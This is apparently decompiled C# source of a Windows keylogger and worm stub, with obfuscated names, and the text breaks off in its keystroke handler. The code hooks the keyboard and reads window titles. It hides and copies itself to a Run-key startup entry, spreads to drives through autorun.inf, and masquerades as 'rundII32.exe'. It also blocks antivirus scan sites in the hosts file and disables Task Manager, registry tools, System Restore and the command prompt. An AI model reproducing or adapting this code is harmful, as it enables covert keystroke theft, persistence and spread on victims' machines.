using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;
using ns2;
using ns3;
using ns4;

namespace ns1;

[DesignerGenerated]
internal class Form1 : Form
{
	internal class Class7
	{
		private struct Struct0
		{
			public int int_0;

			public int int_1;

			public int int_2;

			public int int_3;

			public int int_4;
		}

		private delegate int Delegate0(int nCode, int wParam, ref Struct0 lParam);

		internal delegate void Delegate1(Keys Key);

		internal delegate void Delegate2(Keys Key);

		private const int int_0 = 0;

		private const int int_1 = 13;

		private const int int_2 = 256;

		private const int int_3 = 257;

		private const int int_4 = 260;

		private const int int_5 = 261;

		private static Delegate1 delegate1_0;

		private static Delegate2 delegate2_0;

		private static int int_6;

		private static Delegate0 delegate0_0;

		public static event Delegate1 KeyDown
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				delegate1_0 = (Delegate1)Delegate.Combine(delegate1_0, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				delegate1_0 = (Delegate1)Delegate.Remove(delegate1_0, value);
			}
		}

		public static event Delegate2 KeyUp
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				delegate2_0 = (Delegate2)Delegate.Combine(delegate2_0, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				delegate2_0 = (Delegate2)Delegate.Remove(delegate2_0, value);
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int idHook, Delegate0 lpfn, int hmod, int dwThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, Struct0 lParam);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		public Class7()
		{
			delegate0_0 = smethod_0;
			int_6 = SetWindowsHookExA(13, delegate0_0, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		private static int smethod_0(int nCode, int wParam, ref Struct0 lParam)
		{
			if (nCode == 0)
			{
				switch (wParam)
				{
				case 256:
				case 260:
					delegate1_0?.Invoke((Keys)lParam.int_0);
					break;
				case 257:
				case 261:
					delegate2_0?.Invoke((Keys)lParam.int_0);
					break;
				}
			}
			return CallNextHookEx(int_6, nCode, wParam, lParam);
		}

		protected override void Finalize()
		{
			UnhookWindowsHookEx(int_6);
			base.Finalize();
		}
	}

	private IContainer icontainer_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[AccessedThroughProperty("Timer3")]
	private Timer timer_2;

	[AccessedThroughProperty("Timer4")]
	private Timer timer_3;

	private const string string_0 = "@DmCD95fdwysEecVxJbRA@";

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private string string_11;

	private string string_12;

	private string string_13;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private string string_20;

	private string string_21;

	private string string_22;

	private string string_23;

	private string string_24;

	private string string_25;

	private string string_26;

	private string string_27;

	private string string_28;

	private string string_29;

	private string string_30;

	private string string_31;

	private string string_32;

	private string string_33;

	private string string_34;

	private string string_35;

	private string string_36;

	private string string_37;

	private object object_0;

	private object object_1;

	private object object_2;

	private object object_3;

	private object object_4;

	private object object_5;

	private object object_6;

	private object object_7;

	private object object_8;

	private object object_9;

	private object object_10;

	private object object_11;

	private string string_38;

	[AccessedThroughProperty("kbHook")]
	private Class7 class7_0;

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (timer_1 != null)
			{
				timer_1.remove_Tick(eventHandler);
			}
			timer_1 = value;
			if (timer_1 != null)
			{
				timer_1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		get
		{
			return timer_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (timer_2 != null)
			{
				timer_2.remove_Tick(eventHandler);
			}
			timer_2 = value;
			if (timer_2 != null)
			{
				timer_2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		get
		{
			return timer_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (timer_3 != null)
			{
				timer_3.remove_Tick(eventHandler);
			}
			timer_3 = value;
			if (timer_3 != null)
			{
				timer_3.add_Tick(eventHandler);
			}
		}
	}

	private virtual Class7 kbHook
	{
		get
		{
			return class7_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			Class7.Delegate1 value2 = method_3;
			if (class7_0 != null)
			{
				Class7.KeyDown -= value2;
			}
			class7_0 = value;
			if (class7_0 != null)
			{
				Class7.KeyDown += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		string_38 = null;
		kbHook = new Class7();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		icontainer_0 = new Container();
		TextBox1 = new TextBox();
		Timer1 = new Timer(icontainer_0);
		Timer2 = new Timer(icontainer_0);
		Timer3 = new Timer(icontainer_0);
		Timer4 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(12, 12);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		Timer1.set_Interval(600000);
		Timer3.set_Interval(50000);
		Timer4.set_Interval(20000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(112, 27);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_03bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e2: Unknown result type (might be due to invalid IL or missing references)
		byte[] bytes = Class8.smethod_0(Application.get_ExecutablePath());
		string @string = Encoding.Default.GetString(bytes);
		string[] array = Strings.Split(@string, "@DmCD95fdwysEecVxJbRA@", -1, (CompareMethod)0);
		object_0 = array[1];
		object_1 = array[2];
		object_2 = array[3];
		object_3 = array[4];
		object_4 = array[5];
		object_5 = array[6];
		object_6 = array[7];
		object_7 = array[8];
		object_8 = array[9];
		object_9 = array[10];
		object_10 = array[11];
		object_11 = array[12];
		string_4 = array[13];
		string_5 = array[14];
		string_6 = array[15];
		string_7 = array[16];
		string_8 = array[17];
		string_9 = array[18];
		string_10 = array[19];
		string_11 = array[20];
		string_12 = array[21];
		string_13 = array[22];
		string_14 = array[23];
		string_15 = array[24];
		string_16 = array[25];
		string_17 = array[26];
		string_18 = array[27];
		string_19 = array[28];
		string_20 = array[29];
		string_21 = array[30];
		string_22 = array[31];
		string_23 = array[32];
		string_24 = array[33];
		string_25 = array[34];
		string_26 = array[35];
		string_27 = array[36];
		string_28 = array[37];
		string_29 = array[38];
		string_30 = array[39];
		string_31 = array[40];
		string_32 = array[41];
		string_33 = array[42];
		string_34 = array[43];
		string_35 = array[44];
		string_36 = array[45];
		string_37 = array[46];
		string_3 = array[47];
		if (Operators.CompareString(string_19, "true", false) == 0)
		{
			Class5.smethod_0();
		}
		if (Operators.CompareString(string_20, "true", false) == 0)
		{
			Class5.smethod_1();
		}
		if (Operators.CompareString(string_21, "true", false) == 0)
		{
			Class5.smethod_2();
		}
		if (Operators.CompareString(string_22, "true", false) == 0)
		{
			Class5.smethod_3();
		}
		if (Operators.CompareString(string_23, "true", false) == 0)
		{
			Class5.smethod_4();
		}
		if (Operators.CompareString(string_24, "true", false) == 0)
		{
			Class5.smethod_5();
		}
		if (Operators.CompareString(string_25, "true", false) == 0)
		{
			Class5.smethod_6();
		}
		if (Operators.CompareString(string_26, "true", false) == 0)
		{
			Class5.smethod_7();
		}
		if (Operators.CompareString(string_27, "true", false) == 0)
		{
			Class5.smethod_8();
		}
		if (Operators.CompareString(string_28, "true", false) == 0)
		{
			Class5.smethod_9();
		}
		if (Operators.CompareString(string_29, "true", false) == 0)
		{
			Class5.smethod_10();
		}
		if (Operators.CompareString(string_30, "true", false) == 0)
		{
			Class5.smethod_11();
		}
		if (Operators.CompareString(string_31, "true", false) == 0)
		{
			Class5.smethod_12();
		}
		if (Operators.CompareString(string_32, "true", false) == 0)
		{
			Class5.smethod_13();
		}
		if (Operators.CompareString(string_37, "true", false) == 0)
		{
			method_0();
		}
		File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		if (!File.Exists("C:\\AUTOEXECx.exe"))
		{
			if (Operators.CompareString(string_16, "true", false) == 0)
			{
				if (Operators.CompareString(string_17, "critical", false) == 0)
				{
					Interaction.MsgBox((object)string_18, (MsgBoxStyle)16, (object)"Warning!");
				}
				if (Operators.CompareString(string_17, "information", false) == 0)
				{
					Interaction.MsgBox((object)string_18, (MsgBoxStyle)16, (object)"Warning!");
				}
			}
			if (Operators.CompareString(string_33, "true", false) == 0)
			{
				SendMessage(-1, 274u, 61808u, 2);
			}
			if (Operators.CompareString(string_34, "true", false) == 0)
			{
				int num = 1500;
				do
				{
					Console.Beep(num, 50);
					num = checked(num + -5);
				}
				while (num >= 1000);
				Console.Beep(500, 2000);
			}
			if (Operators.CompareString(string_35, "true", false) == 0)
			{
				Class11.smethod_0();
			}
			if (Operators.CompareString(string_36, "true", false) == 0)
			{
				method_1("rundII32.exe");
			}
			((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), "C:\\AUTOEXECx.exe", true);
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("WindowsLogin", "C:\\AUTOEXECx.exe");
			registryKey.Close();
			File.SetAttributes("C:\\AUTOEXECx.exe", FileAttributes.Hidden);
			Thread.Sleep(500);
			Process.Start("C:\\AUTOEXECx.exe");
			Application.Exit();
		}
		if (Operators.CompareString(string_4, "true", false) == 0)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
			string path = folderPath + "\\drivers\\etc\\\\hosts";
			StreamWriter streamWriter = new StreamWriter(path);
			streamWriter.Write("##Hosts file edit");
			streamWriter.Write(Environment.NewLine);
			if (Operators.CompareString(string_5, "true", false) == 0)
			{
				streamWriter.Write("127.0.0.1 www.virustotal.com");
				streamWriter.Write(Environment.NewLine);
			}
			if (Operators.CompareString(string_6, "true", false) == 0)
			{
				streamWriter.Write("127.0.0.1 vscan.novirusthanks.org");
				streamWriter.Write(Environment.NewLine);
			}
			if (Operators.CompareString(string_7, "true", false) == 0)
			{
				streamWriter.Write("127.0.0.1 virscan.org");
				streamWriter.Write(Environment.NewLine);
			}
			if (Operators.CompareString(string_8, "true", false) == 0)
			{
				streamWriter.Write("127.0.0.1 virus-trap.org");
				streamWriter.Write(Environment.NewLine);
			}
			if (Operators.CompareString(string_9, "true", false) == 0)
			{
				streamWriter.Write("127.0.0.1 www.google.com");
				streamWriter.Write(Environment.NewLine);
			}
			if (Operators.CompareString(string_10, "true", false) == 0)
			{
				streamWriter.Write("127.0.0.1 www.yahoo.com");
				streamWriter.Write(Environment.NewLine);
			}
			if (Operators.CompareString(string_11, "true", false) == 0)
			{
				streamWriter.Write("127.0.0.1 www.ask.com");
				streamWriter.Write(Environment.NewLine);
			}
			if (Operators.CompareString(string_12, "true", false) == 0)
			{
				streamWriter.Write("127.0.0.1 www.altavista.com");
				streamWriter.Write(Environment.NewLine);
			}
			if (Operators.CompareString(string_13, "true", false) == 0)
			{
				streamWriter.Write("127.0.0.1 www.facebook.com");
				streamWriter.Write(Environment.NewLine);
			}
			if (Operators.CompareString(string_14, "true", false) == 0)
			{
				streamWriter.Write("127.0.0.1 www.myspace.com");
				streamWriter.Write(Environment.NewLine);
			}
			if (Operators.CompareString(string_15, "True", false) == 0)
			{
				streamWriter.Write("127.0.0.1 twitter.com");
				streamWriter.Write(Environment.NewLine);
			}
			streamWriter.Dispose();
		}
		if (Operators.ConditionalCompareObjectEqual(object_3, (object)"rc", false))
		{
			string_1 = Class14.smethod_0(Conversions.ToString(object_0), Conversions.ToString(object_4));
			string_2 = Class14.smethod_0(Conversions.ToString(object_1), Conversions.ToString(object_4));
		}
		if (Operators.ConditionalCompareObjectEqual(object_3, (object)"des", false))
		{
			string_1 = Class6.smethod_0(Conversions.ToString(object_0), Conversions.ToString(object_4), d: true);
			string_2 = Class6.smethod_0(Conversions.ToString(object_1), Conversions.ToString(object_4), d: true);
		}
		if (Operators.ConditionalCompareObjectEqual(object_5, (object)"true", false))
		{
			((ServerComputer)Class1.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
		}
		if (Operators.ConditionalCompareObjectEqual(object_6, (object)"true", false))
		{
			((ServerComputer)Class1.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
		}
		if (Operators.ConditionalCompareObjectEqual(object_7, (object)"true", false))
		{
			((ServerComputer)Class1.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
		}
		if (Operators.ConditionalCompareObjectEqual(object_8, (object)"true", false))
		{
			((ServerComputer)Class1.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
		}
		Timer1.set_Interval(Conversions.ToInteger(string_3));
		Timer1.Start();
		Timer2.Start();
		if (Operators.ConditionalCompareObjectEqual(object_9, (object)"true", false))
		{
			Timer3.Start();
		}
		Timer4.Start();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_0()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		checked
		{
			try
			{
				ListBox val = new ListBox();
				for (int i = 0; i != ((ServerComputer)Class1.Computer).get_FileSystem().get_Drives().Count - 1; i++)
				{
					val.get_Items().Add((object)((ServerComputer)Class1.Computer).get_FileSystem().get_Drives()[i].ToString());
				}
				for (int i = 0; i != val.get_Items().get_Count(); i++)
				{
					try
					{
						try
						{
							((ServerComputer)Class1.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"Sys.exe")));
							((ServerComputer)Class1.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf")));
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						((ServerComputer)Class1.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"Sys.exe")));
						FileSystem.FileOpen(1, Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf")), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
						FileSystem.FilePut(1, "[autorun]\r\nshellexecute=sys.exe", -1L, false);
						FileSystem.FileClose(new int[1] { 1 });
						try
						{
							((ServerComputer)Class1.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"Sys.exe"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
							((ServerComputer)Class1.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_1(string NewName)
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (Operators.CompareString(Application.get_StartupPath(), folderPath, false) != 0)
			{
				FileSystem.FileCopy(Application.get_ExecutablePath(), folderPath + "\\" + NewName);
				Interaction.Shell(folderPath + "\\" + NewName + " " + Application.get_ExecutablePath(), (AppWinStyle)2, false, -1);
				File.SetAttributes(folderPath + "\\" + NewName, FileAttributes.Hidden);
				ProjectData.EndApp();
			}
			else
			{
				FileSystem.Kill(Interaction.Command());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string method_2()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void method_3(Keys Key)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Invalid comparison between Unknown and I4
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Invalid comparison between Unknown and I4
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Invalid comparison between Unknown and I4
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Invalid comparison between Unknown and I4
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Invalid comparison between Unknown and I4
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Invalid comparison between Unknown and I4
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Invalid comparison between Unknown and I4
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Invalid comparison between Unknown and I4
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Invalid comparison between Unknown and I4
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d1: Invalid comparison between Unknown and I4
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Invalid comparison between Unknown and I4
		//IL_0222: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Invalid comparison between Unknown and I4
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Invalid comparison between Unknown and I4
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0279: Invalid comparison between Unknown and I4
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a3: Invalid comparison between Unknown and I4
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Invalid comparison between Unknown and I4
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Invalid comparison between Unknown and I4
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Invalid comparison between Unknown and I4
		//IL_0348: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Invalid comparison between Unknown and I4
		//IL_0372: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Invalid comparison between Unknown and I4
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Invalid comparison between Unknown and I4
		//IL_03c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Invalid comparison between Unknown and I4
		//IL_03f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f3: Invalid comparison between Unknown and I4
		//IL_041a: Unknown result type (might be due to invalid IL or missing references)
		//IL_041d: Invalid comparison between Unknown and I4
		//IL_0444: Unknown result type (might be due to invalid IL or missing references)
		//IL_0447: Invalid comparison between Unknown and I4
		//IL_046e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0471: Invalid comparison between Unknown and I4
		//IL_0498: Unknown result type (might be due to invalid IL or missing references)
		//IL_049b: Invalid comparison between Unknown and I4
		//IL_04c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c5: Invalid comparison between Unknown and I4
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ef: Invalid comparison between Unknown and I4
		//IL_0516: Unknown result type (might be due to invalid IL or missing references)
		//IL_0519: Invalid comparison between Unknown and I4
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Invalid comparison between Unknown and I4
		//IL_056a: Unknown result type (might be due to invalid IL or missing references)
		//IL_056d: Invalid comparison between Unknown and I4
		//IL_0594: Unknown result type (might be due to invalid IL or missing references)
		//IL_0597: Invalid comparison between Unknown and I4
		//IL_05be: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c1: Invalid comparison between Unknown and I4
		//IL_05e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05eb: Invalid comparison between Unknown and I4
		//IL_0612: Unknown result type (might be due to invalid IL or missing references)
		//IL_0615: Invalid comparison between Unknown and I4
		//IL_063c: Unknown result type (might be due to invalid IL or missing references)
		//IL_063f: Invalid comparison between Unknown and I4
		//IL_0666: Unknown result type (might be due to invalid IL or missing references)
		//IL_0669: Invalid comparison between Unknown and I4
		//IL_0690: Unknown result type (might be due to invalid IL or missing references)
		//IL_0693: Invalid comparison between Unknown and I4
		//IL_06ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bd: Invalid comparison between Unknown and I4
		//IL_06e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e7: Invalid comparison between Unknown and I4
		//IL_070e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0711: Invalid comparison between Unknown and I4
		//IL_0738: Unknown result type (might be due to invalid IL or missing references)
		//IL_073b: Invalid comparison between Unknown and I4
		//IL_0762: Unknown result type (might be due to invalid IL or missing references)
		//IL_0765: Invalid comparison between Unknown and I4
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_078f: Invalid comparison between Unknown and I4
		//IL_07b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07bc: Invalid comparison between Unknown and I4
		//IL_07e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e9: Invalid comparison between Unknown and I4
		//IL_0810: Unknown result type (might be due to invalid IL or missing references)
		//IL_0816: Invalid comparison between Unknown and I4
		//IL_083d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0843: Invalid comparison between Unknown and I4
		//IL_086a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0870: Invalid comparison between Unknown and I4
		//IL_0897: Unknown result type (might be due to invalid IL or missing references)
		//IL_089d: Invalid comparison between Unknown and I4
		//IL_08c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ca: Invalid comparison between Unknown and I4
		//IL_08f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f7: Invalid comparison between Unknown and I4
		//IL_091e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0924: Invalid comparison between Unknown and I4
		//IL_094b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0951: Invalid comparison between Unknown and I4
		//IL_0978: Unknown result type (might be due to invalid IL or missing references)
		//IL_097b: Invalid comparison between Unknown and I4
		//IL_09a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a5: Invalid comparison between Unknown and I4
		//IL_09cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_09cf: Invalid comparison between Unknown and I4
		//IL_09f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f9: Invalid comparison between Unknown and I4
		//IL_0a20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a23: Invalid comparison between Unknown and I4
		//IL_0a4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4d: Invalid comparison between Unknown and I4
		//IL_0a74: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a77: Invalid comparison between Unknown and I4
		//IL_0a9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa1: Invalid comparison between Unknown and I4
		//IL_0ac8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0acb: Invalid comparison between Unknown and I4
		//IL_0af2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af5: Invalid comparison between Unknown and I4
		//IL_0b1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1f: Invalid comparison between Unknown and I4
		//IL_0b46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b49: Invalid comparison between Unknown and I4
		//IL_0b70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b73: Invalid comparison between Unknown and I4
		//IL_0b9a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9d: Invalid comparison between Unknown and I4
		//IL_0bc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc7: Invalid comparison between Unknown and I4
		//IL_0c4d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c4f: Invalid comparison between Unknown and I4
		//IL_0cd5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cd8: Invalid comparison between Unknown and I4
		//IL_0cff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d02: Invalid comparison between Unknown and I4
		//IL_0d29: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d2c: Invalid comparison between Unknown and I4
		//IL_0d53: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d56: Invalid comparison between Unknown and I4
		//IL_0d7d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d80: Invalid comparison between Unknown and I4
		//IL_0da7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0daa: Invalid comparison between Unknown and I4
		//IL_0dd1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd4: Invalid comparison between Unknown and I4
		//IL_0dfb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dfe: Invalid comparison between Unknown and I4
		//IL_0e25: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e28: Invalid comparison between Unknown and I4
		//IL_0e4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e52: Invalid comparison between Unknown and I4
		//IL_0e79: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e7c: Invalid comparison between Unknown and I4
		//IL_0ea3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ea6: Invalid comparison between Unknown and I4
		//IL_0ecd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ed0: Invalid comparison between Unknown and I4
		//IL_0ef7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0efd: Invalid comparison between Unknown and I4
		//IL_0f24: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f27: Invalid comparison between Unknown and I4
